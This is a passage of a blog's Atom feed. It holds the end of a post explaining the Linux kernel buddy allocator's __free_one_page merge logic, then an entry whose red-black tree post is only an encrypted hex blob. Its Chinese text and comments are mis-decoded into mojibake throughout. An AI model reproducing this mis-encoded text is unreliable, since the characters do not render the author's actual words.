class="hljs-comment"> * æ²¡æœ‰è¿™ä¸ªï¼Œpageblockéš”ç¦»å¯èƒ½é€ æˆé”™è¯¯çš„ç©ºé—²é¡µæˆ–CMAè®¡æ•°. </span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * æˆ‘ä»¬ä¸æƒ³ä¸ºäº†æ›´é¢‘ç¹çš„ä½é˜¶åˆå¹¶ä½¿ç”¨è¿™ä¸ªä»£ç </span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (unlikely(has_isolate_pageblock(zone))) &#123;<br><span class="hljs-type">int</span> buddy_mt;<br><br>buddy_pfn = __find_buddy_pfn(pfn, order);<br>buddy = page + (buddy_pfn - pfn);<br>buddy_mt = get_pageblock_migratetype(buddy);<br><br><span class="hljs-keyword">if</span> (migratetype != buddy_mt<br>&amp;&amp; (is_migrate_isolate(migratetype) ||<br>is_migrate_isolate(buddy_mt)))<br><span class="hljs-keyword">goto</span> done_merging;<br>&#125;<br>max_order = order + <span class="hljs-number">1</span>;<br><span class="hljs-keyword">goto</span> continue_merging;<br>&#125;<br><br>done_merging:<br>set_buddy_order(page, order); <span class="hljs-comment">// åœ¨ page-&gt;private ä¸­å‚¨å­˜å…¶ order</span><br><br>    <span class="hljs-comment">// åˆ¤æ–­æ˜¯æ’åˆ°é“¾è¡¨å¤´è¿˜æ˜¯é“¾è¡¨å°¾ï¼Œé€šå¸¸æ˜¯é“¾è¡¨å¤´ï¼Œå³éµå¾ª LIFO</span><br><span class="hljs-keyword">if</span> (fpi_flags &amp; FPI_TO_TAIL)<br>to_tail = <span class="hljs-literal">true</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (is_shuffle_order(order))<br>to_tail = shuffle_pick_tail();<br><span class="hljs-keyword">else</span><br>        <span class="hljs-comment">// è¯¥å‡½æ•°ä¼šæ£€æŸ¥æ˜¯å¦ä¸‹ä¸€ä¸ªæœ€é«˜é˜¶çš„ buddy æ˜¯å¦ç©ºé—²</span><br>        <span class="hljs-comment">// è‹¥æ˜¯ï¼Œåˆ™å¯èƒ½æ­£åœ¨é‡Šæ”¾çš„é¡µé¢å—å°†å¾ˆå¿«è¢«åˆå¹¶ï¼Œæ­¤æ—¶æˆ‘ä»¬åº”å½“å°†å…¶æ·»åŠ åˆ°é“¾è¡¨çš„å°¾éƒ¨</span><br>        <span class="hljs-comment">// è¿™æ ·å°±ä¸å¤§å¯èƒ½åˆè¢«åˆ«çš„è¿›ç¨‹å¾ˆå¿«å°±åˆ†é…èµ°äº†ï¼Œè€Œæ˜¯å¯èƒ½è¢«åˆå¹¶ä¸ºé«˜é˜¶é¡µé¢</span><br>to_tail = buddy_merge_likely(pfn, buddy_pfn, page, order);<br><br>    <span class="hljs-comment">// æ’å…¥ç‰¹å®šè¿ç§»é“¾è¡¨</span><br><span class="hljs-keyword">if</span> (to_tail)<br>add_to_free_list_tail(page, zone, order, migratetype);<br><span class="hljs-keyword">else</span><br>add_to_free_list(page, zone, order, migratetype);<br><br><span class="hljs-comment">/* Notify page reporting subsystem of freed page */</span><br><span class="hljs-keyword">if</span> (!(fpi_flags &amp; FPI_SKIP_REPORT_NOTIFY))<br>page_reporting_notify_free(order);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å°†ä¸å¾…é‡Šæ”¾é¡µé¢å‡‘æˆä¸€å¯¹çš„å†…å­˜å—ç§°ä¸º buddyï¼Œæ‰€è°“å‡‘æˆä¸€å¯¹ä¾¿æ˜¯<strong>è¿™ä¸¤ä¸ªå†…å­˜å—åœ¨ç‰©ç†ä¸Šè¿ç»­ï¼Œä¸”èƒ½å‡‘æˆä¸€ä¸ªæ›´é«˜ä¸€é˜¶çš„å¤§å†…å­˜å—</strong>ï¼Œç”±æ­¤ç§°ä¹‹ä¸ºä¸€å¯¹ buddies</p><p>è¯¥å‡½æ•°ä¸»è¦æµç¨‹å¦‚ä¸‹ï¼š</p><ul><li>ï¼ˆcontinue_mergingï¼Œå¾ªç¯å¼€å¤´ï¼‰è°ƒç”¨ <code>__find_buddy_pfn()</code> è®¡ç®—å¾…é‡Šæ”¾é¡µé¢çš„ buddy çš„ç¬¬ä¸€å¼ ç‰©ç†é¡µçš„é¡µæ¡†å·ï¼Œç®—æ³•æ¯”è¾ƒæš´åŠ›ï¼š<code>page_pfn ^ (1 &lt;&lt; order)</code></li><li>è°ƒç”¨ <code>page_is_buddy()</code> æ£€æŸ¥ buddy ä¸ å¾…é‡Šæ”¾é¡µé¢æ˜¯å¦æ˜¯ä¸€å¯¹ buddiesï¼Œè‹¥å¦ï¼Œåˆ™è·³åˆ°ï¼ˆdone_mergingï¼‰ï¼Œè¿™é‡Œçš„æ£€æŸ¥éœ€è¦æ»¡è¶³å››ä¸ªè¦ç´ ï¼š<ul><li>buddy ä¸åœ¨ç©ºæ´ä¸­</li><li>buddy åœ¨ buddy system ä¸­ï¼ˆå³ buddy ä¹Ÿæ˜¯ç©ºé—²å†…å­˜å—ï¼‰</li><li>å¾…é‡Šæ”¾é¡µé¢ä¸å…¶ buddy åœ¨åŒä¸€ä¸ª zone ä¸­</li><li>å¾…é‡Šæ”¾é¡µé¢ä¸å…¶ buddy æœ‰ç€åŒæ ·çš„é˜¶ï¼ˆorderï¼‰</li></ul></li><li>è‹¥ buddy ä¸º guard pageï¼Œåˆ™è°ƒç”¨ <code>clear_page_guard()</code> æ¸…æ¥šè¿™ä¸ªå±æ€§è®©å…¶å˜æˆç©ºé—²é¡µé¢ï¼Œè¿™é‡Œæ¸…é™¤çš„æ“ä½œæ˜¯é€šè¿‡å°† page ç»“æ„ä½“çš„ private å­—æ®µç½® 0 å®ç°çš„ï¼›è‹¥å¦ï¼Œåˆ™è¯´æ˜æ˜¯å¸¸è§„çš„ç©ºé—²é¡µé¢ï¼Œè°ƒç”¨ <code>del_page_from_free_list()</code> å°†å…¶è„±é“¾</li><li>æ­¤æ—¶æˆ‘ä»¬çš„æ–°çš„é«˜é˜¶å†…å­˜å—å°±å®Œæˆåˆæˆäº†ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å›åˆ°å¾ªç¯å¼€å¤´é‡æ–°å¯»æ‰¾è¿™ä¸ªåˆæˆçš„æ–°å†…å­˜å—çš„ buddyï¼Œè¿™ä¸ªå¾ªç¯ä¸€ç›´æŒç»­åˆ° <code>max_order</code> ï¼ˆä¸€èˆ¬æ˜¯10ï¼‰ï¼Œä½œä¸ºä¸‹ä¸€æ¬¡å¾ªç¯çš„é¡µæ¡†å·çš„è®¡ç®—æ–¹å¼æ˜¯ <code>buddy_pfn &amp; pfn</code>ï¼Œä¹‹ååšæŒ‡é’ˆè¿ç®— <code>page + (combined_pfn - pfn)</code> æ‰¾åˆ°å¯¹åº”çš„ page ç»“æ„ä½“</li><li>è‹¥é€€å‡ºå¾ªç¯æ—¶çš„ order æ»¡è¶³ <code>order &lt; MAX_ORDER - 1</code> ï¼Œåˆ™è°ƒç”¨ <code>has_isolate_pageblock()</code> æ£€æŸ¥ zone ä¸­æ˜¯å¦æœ‰ isolate blockï¼Œè‹¥æ˜¯åˆ™è¿›è¡Œç›¸å…³æ“ä½œï¼ˆ<s>è¿™å—ä»£ç è¿˜æ²¡çœ‹æ‡‚</s>ï¼‰ï¼Œæœ€åè·³è½¬å›ï¼ˆcontinue_mergingï¼‰ï¼›è¿™ä¸€æ­¥ä¸»è¦æ˜¯é˜²æ­¢ isolate pageblock ä¸å¸¸è§„çš„ pageblock å‘ç”Ÿåˆå¹¶</li><li>ï¼ˆdone_mergingï¼‰è¿™ä¸€æ­¥ä¸»è¦æ˜¯è°ƒç”¨ <code>set_buddy_order()</code> åœ¨ page ç»“æ„ä½“çš„ private å­—æ®µå­˜æ”¾è¯¥å†…å­˜å—çš„ order</li><li>è‹¥æ˜¯è®¾ç½®äº† <code>FPI_TO_TAIL</code> flagï¼Œåˆ™å°† <code>to_tail</code> ç½®ä¸º trueï¼›å¦åˆ™ï¼Œè‹¥å†…å­˜å—çš„ <code>order &gt;= SHUFFLE_ORDER</code>ï¼ˆ<code>MAX_ORDER - 1</code>ï¼‰ï¼Œåˆ™å°† <code>to_tail</code> ç½®ä¸ºéšæœºç»“æœï¼ˆ<code>shuffle_pick_tail()</code>ï¼‰ï¼›å¦åˆ™ç½®ä¸ºè°ƒç”¨ <code>buddy_merge_likely()</code> çš„ç»“æœï¼Œè¯¥å‡½æ•°ä¼šæ£€æŸ¥æ˜¯å¦ä¸‹ä¸€ä¸ªæœ€é«˜é˜¶çš„ buddy æ˜¯å¦ç©ºé—²ï¼Œè‹¥æ˜¯ï¼Œåˆ™å¯èƒ½æ­£åœ¨é‡Šæ”¾çš„é¡µé¢å—å°†å¾ˆå¿«è¢«åˆå¹¶ï¼Œæ­¤æ—¶æˆ‘ä»¬åº”å½“å°†å…¶æ·»åŠ åˆ°é“¾è¡¨çš„å°¾éƒ¨ï¼Œè¿™æ ·å°±ä¸å¤§å¯èƒ½åˆè¢«åˆ«çš„è¿›ç¨‹å¾ˆå¿«å°±åˆ†é…èµ°äº†ï¼Œè€Œæ˜¯å¯èƒ½è¢«åˆå¹¶ä¸ºé«˜é˜¶é¡µé¢</li><li>è‹¥ <code>to_tail</code> ä¸ºçœŸï¼Œåˆ™è°ƒç”¨ <code>add_to_free_list_tail()</code> å°†è¯¥ç©ºé—²é¡µæ·»åŠ åˆ°é“¾è¡¨æœ«å°¾ï¼Œå¦åˆ™è°ƒç”¨ <code>add_to_free_list()</code> æ·»åŠ åˆ°é“¾è¡¨å¼€å¤´</li></ul><h2 id="äºŒã€ä¸Šå±‚å°è£…å‡½æ•°">äºŒã€<em>ä¸Šå±‚å°è£…å‡½æ•°</em></h2><p>æ‰€æœ‰é¡µé¢é‡Šæ”¾çš„å‡½æ•°å…¶å®éƒ½æ˜¯å¯¹ <code>__free_one_page()</code> çš„å°è£…ï¼Œæœ€ç»ˆéƒ½ä¼šè°ƒç”¨åˆ°è¿™ä¸ªå‡½æ•°ï¼Œè·¯å¾„å¦‚ä¸‹ï¼š</p><p><img src="https://s2.loli.net/2022/07/06/ktV7cNlohiQCSWP.png" alt="image.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;HEY DUDE!&lt;/p&gt;</summary>
    
    
    
    <category term="OS" scheme="http://blog.arttnba3.cn/categories/OS/"/>
    
    
    <category term="Linux" scheme="http://blog.arttnba3.cn/tags/Linux/"/>
    
    <category term="Linux Kernel" scheme="http://blog.arttnba3.cn/tags/Linux-Kernel/"/>
    
    <category term="å­¦ä¹ æœ­è®°" scheme="http://blog.arttnba3.cn/tags/%E5%AD%A6%E4%B9%A0%E6%9C%AD%E8%AE%B0/"/>
    
    <category term="å†…å­˜ç®¡ç†" scheme="http://blog.arttnba3.cn/tags/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"/>
    
    <category term="buddy system" scheme="http://blog.arttnba3.cn/tags/buddy-system/"/>
    
  </entry>
  
  <entry>
    <title>ã€ALGORITHM.0x04ã€‘ä»äºŒå‰æœç´¢æ ‘åˆ°çº¢é»‘æ ‘</title>
    <link href="http://blog.arttnba3.cn/2022/05/28/ALGORITHM-0X04-RED_BLACK_TREE/"/>
    <id>http://blog.arttnba3.cn/2022/05/28/ALGORITHM-0X04-RED_BLACK_TREE/</id>
    <published>2022-05-27T21:50:46.000Z</published>
    <updated>2022-08-28T20:46:56.787Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="å¯†ç å‡ºé”™å•¦ï¼" data-whm="è¿˜è¯·ä¸è¦åšä¸€äº›å¥‡å¥‡æ€ªæ€ªçš„äº‹æƒ…ï¼">  <script id="hbeData" type="hbeData" data-hmacdigest="a3ffa94419157e929ad2827e7d7d8ddf576277f99bc8165e131545e9a35b12f9">afdbd80b698a50e90523fd700308ec65f44e06d46f63079433cfca60657b16ff93bb2b1a04d8edd7ab5ff0d1b5476a6fd26393991a7feb303675f276bef9bd6d95051256b4233fa4340b26aa06280f64514ab8c3b30fa20ac5118fcb917d57ad3b481c5c43dd420e88cf175e2bce126ca7455645d534362aa994abb13840873abe27c8a1581cc14c6651c6d06a034d050b4c25fd58ba26994e703a14c050e325a683687b332969019fa936273472434a3533324279259ad51d532aab5349a738fd09c08310163e0bc9907676d623e8fa3c6588a9259dc32e180bcf83472a5b79fa66ace6aa4f4617c2ea2cbb7ea607f1b7fd940e068e3aca589e2b16032a99b266aba9c8aa64125673fdf7fb87a688745577f1d63c225fdad8723e7fe161736f17220ce05fc0f8229c2c87774dbb1814b111a48fb961add75391219be5b8cef3e0c8556adcc8e9ae86fdc7e4f7541a5d389e36509955fa1ff997bef12411fd92ce1b551421a5a9945cf1b3bfc5e85dbb8317849c58ffe5ee04a064d35af86a9af3d972fbb73c85313b9936782bceafd8532f4853cebe6fd3fa3d23c598b937caabd28e36696023a2bd59e3fe0a93b955f914077a1ae5840728481d51be7a35d059bad5f4c5bdfd867a404fc23315f5897e364af3b6158c418cc2373b6a2a81f64eb803e78ee44236677cce6545b45d854f6b14c8d61e0ef1e5dc0b0e33e18eef2f1eb3cc2bc266a060bfbdf3d0a2d5984ffe9c7138e9363ee78989c3b4dc4302495100da7798d624eaf0bfa0e529e4481dc651044cfbfe5a120a6de427366c1db33481989f206d88e437f0e7c71b3e5317392260c731c65738d0d08507218ba22226ca8c0f3855153cb9dcb15f2b92911116fb6eaa4fef68aab5a45dd140361995bfa6cc2bf6ee0194b3249f1f677256c1e3cca9dfc3e3ecb92328e44bef568d99627bbfafaa3ae75de1044d9b0a16a60d8f6529985ddfa72f9ed88844b0f10766b3345ac58747abbd41a5bfd11fee6e9373a855a2fa99140a793b51f5b0326748ff867dc6b96fd09f8d9092fcf3d72de24d09536241998d6627b02fd65897ddae803b6abaeecb2cb70776dfa1e5bd80b27114e7c40a873e15f699cabba20788f3440a3673021801c0265562d02d6c9be2e601a4f755a2c36350f285378fd603b9209bd42653ac5c687cb74128de6799fa28166ea02cbab8c891b739d307517c908068e7a98ce044cb3be4aad7d9b27d4a159a6934c83631ec23cdf5edcf77088cda4fb45e83f729156a73ed719562a0254cce5e20e7db119a80b5deb356ad71f16b5b476630cfedb2de986310adea5a6226ccebec4af406528cd7ad6872efe556c02d6508a95064dd8673bda0c72ca6d67b621772b91d102a970ca1213d53cd30dcab8c00e2dded0129319f44497781f0d98d668da7271971443751f2d5a21e4d6be9ef7ce53650b01fad3ab17275715c283899053545021e4d08a28d771f06042c9da045d213727041cb3a265d40346fdc490a5743d8c0a9bf872ac82049acadb68289a916ed28bdba12ddbdb8c781f6f7fa418cc5ee83b316e174eb3cf66544ee597071d92df67ccb3c46d3485e99f09741a57aca9d53bc64e77c600e6c3fa1a451b5bc0ca63ad08d2288c5cca84e5149d69dc0ea1ae7297a8a1c9ff428c5ecb9a374ed91d8e5bec0494d7529fdda7bdcff0b36887ff6f99489f1411789df400bec44890328f79692e30a3ec3a6d407b718039571c7e12e9e45c3616cf86998993def58da4ad31c971371cf055dadbc198ef482bbe0ad9861fb6d5b1f7d84d6e408af65a7e18bcdd147161d17c9ca8625626dc43fbd9d53a2f0cd26b2a7a22aed5bcc61be7418db22912ea69794911fd8bafd482f0741334631c1173f83a3bf1dddadb695e07fd12af7d5e76ad2212aa022db2c75a079e40cc1c86f1d22cd87809979fcf85d5a2e72a40bc317c474f5b4541265e5f40bdb9d8e2bb1f8ba99aa5e21e6efde375325d1612bd46e302b68d9b455c90ff2b39cf6f89ea754e3126ecc4c80505398a2c10f28ac222e7dcbe2f3000de60cc4491697637eaf24be13ae1ee50b4180ea933eee6aa7d70f2fb1ffb7bf720e1fb8da6c9e750f0ea029fabd418c15b92a84b8419608155a65a882157b85978eb8998e1d6beac0e4c03ba36867af81350499f77dc32e016067ce5691205464437cbaffe94680f6c4bc0ad332ed10cb73b6cc7c326a314e8712eba26e233c9d0a1a3e31853d3bb9ea656dcd5795724a92225af209b102d5a1aa2253878acdd9796eef14c9453ef55c7bdee3f5ed1fae714b49fd63f3ebd736a9bddda569a64b9beb70ca2cb85504130bf126ec39b4b754bea803a4d0ffaa8975f8d99db655f4e275f4763531b8ee264e401d5cf37c28a975d2771a2f9a313738151b419c6f9f99bd905c57b4725a22433e94a835a723e2ff245a19cf276f74607e7fc1b8ed721467b39dae543935d78cb29ed8f8fc313a6ab937dfe6f7bc5ed3db8d9d2a86895cc8a04f4ad71a4eb19a6bcf4dbd07ecbdbbeb657d6c47c2d66ce6d3efbc65df219ffe65539d2480db8235e1e320ecb493b4897e5d7c80a209a6ff033c805bdd0afc87ed4df64e8e8c9fd30bb5a9bb651ba58da40d8d8e6192c557a2dbc27ea6cd765f022df70c7eadacfe0c9917e10da5b4156aea29fdcba94af3bd1e99cc88decc8119aaea0cd2a0f63a61a34124ba679b89dd15623c6a8a5c4608d23eec23c0b434499b18f36844148de0101bff9bd350fd9d2752a16ee572fbc193815dfac48d9519f00d3d6799696e0992d8528d2b029b9080ee3e833dd08397d59ede05a0c015f1a3fe4da07827f6071801a43abaaabc0680f6fe460c3642e717ecf8fa0b7376c201a4287d210a93b03b1f49737f51eeb4594572475e0dda00eba76e45018667be6f1625cdb4bba3d97b8f99aec7407b2706e912e2729a20531660b46aa0977323fe855a08e5a5f28a9a6e572e05d8a5110a6ee53edec966b4fe735764aa95152c150782a4e306f4c3cedec6f90e75465bf80b8bdeb15e39fc03026b6165bd7b50a7ea007be0300939b838d9b282b55b072a7c27aac2960cf2e463702c8b859b7cea0ee1cd2890e49a8162e8c775ff284435ef10f83359da8bea2712137782349fde453a1b3f261d2fe0819695002dba7a923c91c337e19e2ddca3ea4fd3b1f245400227c91a50f8b50da31d88ccfb97d260772b4ee7b202599a4df834c8c49536f23a00693b6edeaa4d15abbd2dc8ce1cbf4d333080124d25c340ffe85531584efd1277b3d84ca5e2b12d20b94c86249997c674778a8dc4942f4c2b7ffe00c52c69ac474ecf588b43ca53c76eaca34ec7430d3b5e8bc294b3f4131e8eb9a2a1d25759b002542f819b2a9a2a71e70339d773b545c7fea55e910efa831d638a408eeba50e926470bfcdd4026c52f5cedcaa44e5a0db2c59288a9a6ba960ec2cd157346d6e6d32ca3c450c6371dfc8af480244a3df538cb99253c0d899f43608eb5c9bd618e06e81ffba1e3bf22e4840d31d8c8ba75eaa5f6021aa2f06ec827b25edef7bddd81468786c471422842d5074585ab411b00d8be52d0d6e10593d82f62f0481d48bda4d5f8d2bb4027129c1a82efdc706dad76b9510234c0a1355dd264bfd9545e0c36ad72ffaaa870941f853eb62e265fd5a3ae682cddd2e7a2b6ab0f6c866d6d21ef32c1ae17198945022367ccd023dc2172c02d415bb92f02733ed7eb0e83165898c6bd78682c507ddb8ff48d3ececf5104866d3b9c97dd777b5ddced3d08cdcea55e060a487fee5c6f7c4cd12ccd90c570b466dadc7f4ec36baed0a785fe7f4c470ee1e632c9859f3bc7c3c2fd8e32adff21ae881497b055f5302367ee8f97749adb4dce4703fbb0a10acf5213d6160cef0fc950f044f6ff700b971b85f907668345d5b688ad5292c816a422cc11b2b3e50119612162f3bce8f6cdbdf6c6055b23712fcbed0b80e491d55f8faae367570f042df9d7def35198d0670675fa73d796c365228fdae4bb2136d44a1e13cc00d552e511f9d2db8431d44237cf5c2656b951a314c2f835e07d08d308ac05668bf7d9b2523b46bb2c91402fcb383d30be6b92c2a0ed3a9ee8b4b6e5429cef452a048625b3ea487ef7475e0de594950459741a86a16cf08f051e194a8c72e16d954964b063b9b03c4155ba8851040b93937ff76456ac7f81656c77f08ea63b986a91f2dd8f2ba57742d5d0bd94ee3395977a873f8c321c223f47a01e11c51475f96f44c1858dc1b3b5994674e287de9e7af5c484f380be690a0c7327a90b2629490bbf5c6f6609a7a5d592db9495fb2d48e9c428a714fb816513948badc2ca9c07ded80d80a75990738336fc4c4c63b88ef983807e090b00a92d4f0e40e9134f8ee19e3b82866ed9882b718b900a3ee2229fa87c60e0231e5e9f86d293231cb9520603b2196b7ffc2fffaaec28b8644b3b29edfda02064955b47b14374ecd25995dc7d8a6e48ad7cc05af9e0c2dc27295ec37997a4558d348e38733dc367eea57b01e25229bc0ce8092d427764a10c4090870c748353ea4a6f60ec9ddd50e3ddd3f3fc96e16fd17d457e8a3eb2b195a024d793c9f5c8b62b78ccb49a126b65714ffe8d1f76e30400fcd14fc2ce5ada98b55d14cf7915afd0e786d8cb723cdbd2fb007a01810b1018cc0ca94d335c2c7d39bc86b3f1d23fe377e355732d17205cc7f9c118ea19ec65b36854a6092c104031e56923e23634293668545b5185afe1470d6ee4fb3b3634be3138762a7ea781dcfae5f38a7a2c669431460a66bde47197095da7c29403f32cadbbc3b93b56f9fff2ea5800825eba55bcf0cd42009304025679a389ea4a4d51e26def88da1ee297e196653b6cb2c9d5732eb7003bcfb14a659a11e951b619c48bceee1e2ac9243de5bf9be3cfb646582439294082cf67a893a4395a9308fff36c71739cb4beb4dd42085796ec416ab21dbae9f64a1dcafb1955459a9370c21b06e6bd5a5a719de31905cdb0d74304108933031d91b3ec3530abe6edf9f7c024fe04c10c6632dbf3e94e1ca5dcf8180b04add20154e20dd3871022f0de26a5f1f75c15fcd7eba58e07f857f28982405711cf1307e80cee0e5e4ece2532a348b2e7e17ebffceb9e3d795b6b381c57e9f93c092c24715260cd121769d92c19460d4af336355f423df12fc976fb3ba55562cd5fae89066e971b5bb4a5ae949b30a892e5018480a09b07238c9652fb026c305485ba2389945cc40201ebe1a62fb4733f3cac037cf668cc9d8417cea2115c8c60a8e5f8913b5cf5d25853db9dd69b6d3ae978e70c699236e933eaa993400017ab35e89022af40b849a8bca2937afdda9e1f4b2be441baef57191e0d5b3d92ee305155fb4df4dc28df0f31258edc48ea658e0dc7637f5866d64e69750d574f7e6cbb3718d45199af2db601e1b1065d08716bc3f08b972b847e83d15bafe90e6918b8e2ce5ca4554f746d3978f7ecb00c252e2f011d10ec87a87490ee90efc9d26cffd9e3f865ace0b211a5553ab37851a1a493a52f33c29b3e4447b4f8fcf36a0f00e93a471b8442f82f5133b56d0c38e3320498341b48609ba10487ef6c9e5e0ce7a3c4c3c6af911970ff0bba9fe73fd1b0670466fc88492bfa8b4a1e45a939367bb419e5e075afcd4ee86ecbfa7c2c91ec921cd9f68a78dfc549337c52cad9181e468181ddbc66fab7b6ad645d8316651678627cc76299f8926fe70500a08674207700bf33cef2c15a0d9f028f47f2302abfd2bbd10b1e39398abed46f68b32b5e080363067a0001032581c6b9360531a3abbb320a7608603a1f91518b7251c6ccdeb28adb07869d8a45732a78f693ac07de628a010817b86aa719f3f5d8dd676fe6868b8e98a648444fd855e0b83f6a1959f9ba181fd7f032a9672424abe9948c1fd55c7126d5f65ff6196256fe3ec4a502b66491c7889533d07d5604987b2c482889eb5c2097912a87e4ea79415b40076b0f14dd27a2f290ffda5daa9544be705ce304114e35668b070f84a267e28989ad09930b5b7103cda4b28bcbea97511a8470f9a0ef5519dc68ac94a1f91127c44aafa3cac59c3d74a03d1d43d108fe6a810315f218ddced67fe8663e1fd73e9aecb88ebee8d0bd5fa26c2f5348b67b0273eb9fcb7ab04802f4c6f704a43e38fb57c51f1693602a66eb09289113a98831be4fa5c94ac0e2f7345a26e15785f24b29e09c889ccee1a6e771a99d8bea31486fe811958be3b19e680947ac1431538a9c2d0e69ac4f512fd20526567eb766ea1a170680bdbad65167a5ce0fac8168cb9d6c71b194b5045132f37ff9b2e77e89ba51e2d35e7d0367d4d223212592c68552720e3fe412ff4f0c1627520080f5ba38946b12412f9013fe54720bf6dfc501b9ce67f5b4495b4750cf32d2dc0ce5f3e991490a68ab319421ed2b1ff3f6431ed36ba6c440fd891f3777747c2aeda9171e00254710e5b47e1a01caa837d29c981008f0e904647a65053b044ffcb82bd9f631262d458cc15e89ef7724cb4cc7b1a19741c495dcfdf8950032832c280d2a4de9e415ece498121cd31a99b72ab96067e5b2759610ecb6bcf28e969551dba847c8718b179d33f4a311a260c79ab74772133f0fd0c37f4ba50eefe926e3c4089b3d7cbab350cd61ab6d593a88003ff8fba44b3db4c74bea5d537430354414f6032be8107d27e49e773f6760d62ab7f8e900baed7002a5eb9b78c89a817a70770529845aaea1a61ce5026ff3a41b4359bb3f9acc8782ba82d651e79b186a5ca9e864ce5a80ad0be041d9d3f51102936056136e449e2a572474e68ca3131825d7d74e67e6564e92887b96c79732210a890888364c79a6542caed6e898cd489f549308459791979388cdefc8d4e9f1e3d8c66db4e84e7fed62b7d46b6e2c526a080507d976077fb3f814382c1d9a931adcb5dfc9a1a4076bb86a2a7359bca7a3ea9daa9cd964c6321d7a460a571f0f71d3b992b3361c1a254447b5a508195d90a5dbfc8018274b91eec859574725f9cf9e1fd9ae361a5c61323aa90a0ede8d567c81c50237235beec61ea187a3ba390570012efa1c64af7009f248b724d090cb88209c871a450fd32516846f74eb4f796a31de4ac4b515a269cb3ccfc7e80eabe53d1e1c8fd45f9ac8df5b00192580a335adc28e5c2d8d6de5d0f6ea457d5cbb01559c6e8f288aa7817198bbb28119077b1f47debdf49f21ceb6b31460dbae9bbaa732035cbc552c5935d1fa7b4db44379d84774383099cc864106234b47df148254c681d8a88912f6b7fe129301768821e40da2ff9fe9f83f7efd75d686c244a7ab24f3fa2ae7fd4c06d8b8ad2200b94bc5d85bd4b1f5edd0d57e5ad995f0e2b7c44531e102075eaba94517957d785e4f15e94bc11f3ff4fe18ab12827e6eb1d2f340ff30a4274d312e6bb1732240bcc644820f76b30f12208d281fd49c756bdfc21ccfa8f99c426dccfd6689a30b854a0a8e5571df9be62ff6143f7554cf9b1910c9fc8bf37ada272a466bb1b072665646c0b20b1baa1b39cc463a46cc285a4507b8c39a24cb0f510109b6b61565f06c1f82a5f21c95bda2e125704881f405241c94e721a3a83c217b3e554ac9deb503805aee3bba8310fba6a491714f433501bce853b6682747a23e71fb70fb93f6407fb79703e87633e0a21eab73abbc73780c142239efa4d6e0297725f59f086691e1e64fa7041f90c9a958050f1fcdef58e2e96e8d671c612103c8c9027191f25aac5335c5e84d8fbb67b5346e8eaf05004ea21bf353395a0ccc4062821c2bf42130438a1367c87c2e4652e79e571ed94a2418bc7a21e744a593e9053ae6937c3e5b48b3f65a08409257a46cd1c3779b5fe6f483701393f9684de4456ed453e401617fef512f6b57be6d3c7845bcf73edde18867f688c586e5853d27aef512bd930a4123ffb8d02aabbd013a453642fe6e3a816991d4446853809cea4fcd3f4568fdf359c95a5875ac27063d3c8e2114e88fa8293e61fdf792de3547847689cf787fbba3874c140936aadd7d9eac5c99905c8263c7de7941a6152d6e10d0b08516281d0d06a61470364cf4b825e888c88a967788e820738acd88864a0f297ffd37fad788f785cf885ebd04b7d9b11b3a4e1ac59698de0808b344f6c957d4ccb656ecbb6423ea33deebcca99cf3a3bb5b22e842545eb3fe89bbbe16decaf402472af76a3e7d49b49bd4724a86919928067412d8f56fc6349ff252d29762587c9c2ac46d2a9cf09489c6ffd1c58ab779be1553febf23f7d3324c696d1a608fe396627971f389183f4030feb1cb1abbf3bef0d118fa882803b41b4b300f8b94bebfbf2d90409e74baa3d6dfd53cddf098dc3febdb759254949cd073ee4475a7bd50a8a50250168cda49d90926e189c33eb97bb11a835a11c346d592f88d720244e071235debaeae33dc3075d3313585868f396a3a45f722ae8074e98d2bcf3cb48e065a5ede2b56f5245b7213e1c38cebb720bbce6a4eb34f0879de33c191a9078b229cad6bb1afe98b95757ddff1ffe8b4789f4d2009bc8bab749fc4414b15aa79f38c414c8b0c72c4ab6eb91ffa45aee3359769be7acbc2702ceed5522206e54df4231fa9c1aed52901b1a9bd292339020c9d9d0716af20a7d565c9ca6bb09bf53f90f1381a61fa4617a8323e96148380948ec78ee6c311de6f5aa1a9c5f55314973691a8baa66cf4d78d90c7e71f370d80794ec80fdf09da3a704891fb4630826baf54fd97bb3baea405bd88ca8344913038a0b205805f504939db2711d3a773c80a8bffda5b58b5bf2b0484c537ff509cff45d7157edc561a97eae91fd21622597d9812f11b38b9dd569d04ec941665e607b28aded438642a71dfe86255aac10612a5c53d0512e878faba12f607fc9cd7286ce5b43fde834ea7c20ce5d5065b2a1f5e2ac2b87cd2248f33d753a8795096510a587fc05c948bfee678726cb1c416e06809d6873ad91b72d69cbfc135a7898d2221fe2e910e8060d9dee4e1884146b7448d0bd5783525886733dc4f19aec4c64a7e2b7231eaa23e5aae0d15c02da5ad3258d0c9b26206dd94722b66f8fa33d049c83b222a134ea797865557b8c9e321f2cb419f82f19df5927214e4c5486d4e3478a99693066772c191802779656f36610a7a0e9c4f75dce766c9595e620bd583eebd9e444b2b734d3edcd17bf3c670223c13ba68c3448ad99040605d4b36a4acf026c02a8ae69f08dcc3e1687320bd72ae41f0cd985b307fc4d4c3e0825dc155368f9cfc372f58d9917c98f38ba65fb0a8c1b1dfd23610f962f56e1e2e5a567b1fff6d99f47c0491dc80717605c60aac328bdf6c4d1967a0819431024128951d487739ace49c0201ef07dc52c3ae00797b88b87810efd01350bc5f816127067e3dcd9c581059364e645cf8df8e24cf9978b84220422562bc6220a7a030d235a78835a77715496e31f15d6ce6b2a18c76b449ff5c963e689e3157992fe6d8508f964c7a02cecfe30f38c249f0aca2e07b4cb0265cbd54f0e35fe5a27fbd3bc868bbb16a17a41da371a4635c4e7a5b0e407eb54529392268895a232388b55f7bfb2ac6989a612245ee9d69a2cab44485b99484347215095d0f47b1045c603c97c64872d482cb8009b85741cd575b7a2c0e8ff9f7174c8bc9e53eb4f38fbb720e74310d8089e6cfcc78441ee6c6c8de582f83c09b33cef3635e5624fb522302bda5293f2419f2c6d72dba7c959ea11b76d1737963109298acffbc0cb4bde467f13ca2f74c24d74d7e423298136eb53021dffb41c40c0f101bef7f1e644b72b93bc7955f3675f1f548d79feb13e1a25c54394a513b2909e88f054def6161dd42acc1f6b8